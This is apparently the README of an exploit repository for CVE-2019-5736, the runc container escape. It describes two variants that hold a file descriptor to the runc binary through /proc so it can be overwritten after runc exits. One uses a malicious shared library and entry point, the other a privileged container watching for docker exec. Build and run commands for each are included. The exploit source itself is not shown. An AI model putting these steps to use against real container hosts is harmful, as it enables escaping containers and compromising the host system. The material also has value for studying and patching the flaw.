### Exploit for CVE-2019-5736 

#### Version 1 (original from [DragonSector](https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html))
use a malicious.so(which used by runc) with  malicious entry point (like #!/proc/self/exe) to hijack the execution of runc, and then open '/proc/self/exe' to hold the file descriptor. Then fork-exec to run another process, and the child process will inherit the file descriptor.  Finally, the child process is able to write to the fd after the runc exits.

> Notes:

> do not need privileged container;

> need a malicious entry point program. It's no problem for ```docker run```, but ```docker exec``` has to run that specific program.


* build and run 

		cd CVE-2019-5376/v1
		gcc run.c -o run -static
		gcc run.c -o libseccomp.so.2 -shared -fPIC
		docker build -t CVE-2019-5376-v1 .
		docker run CVE-2019-5376-v1


#### Version 2
start the malicious container first, and run a process (in a loop) to monitor new processes in /proc. On finding a new one, open  '/proc/{pid}/exe' to hold the file descriptor. Then it's the same like above.

> Notes

> need privileged container

> works on every ```docker exec``` command towards the container, but will not work when using ```docker run``` to start the new container

* build and run 

		cd CVE-2019-5376/v2
		gcc run.c -o run -static
		docker build -t CVE-2019-5376-v2 .
		docker run -it --privileged --name test_instance CVE-2019-5376-v2
		
		# open another terminal, and run docker exec
		docker exec -it test_instance bash
---- 
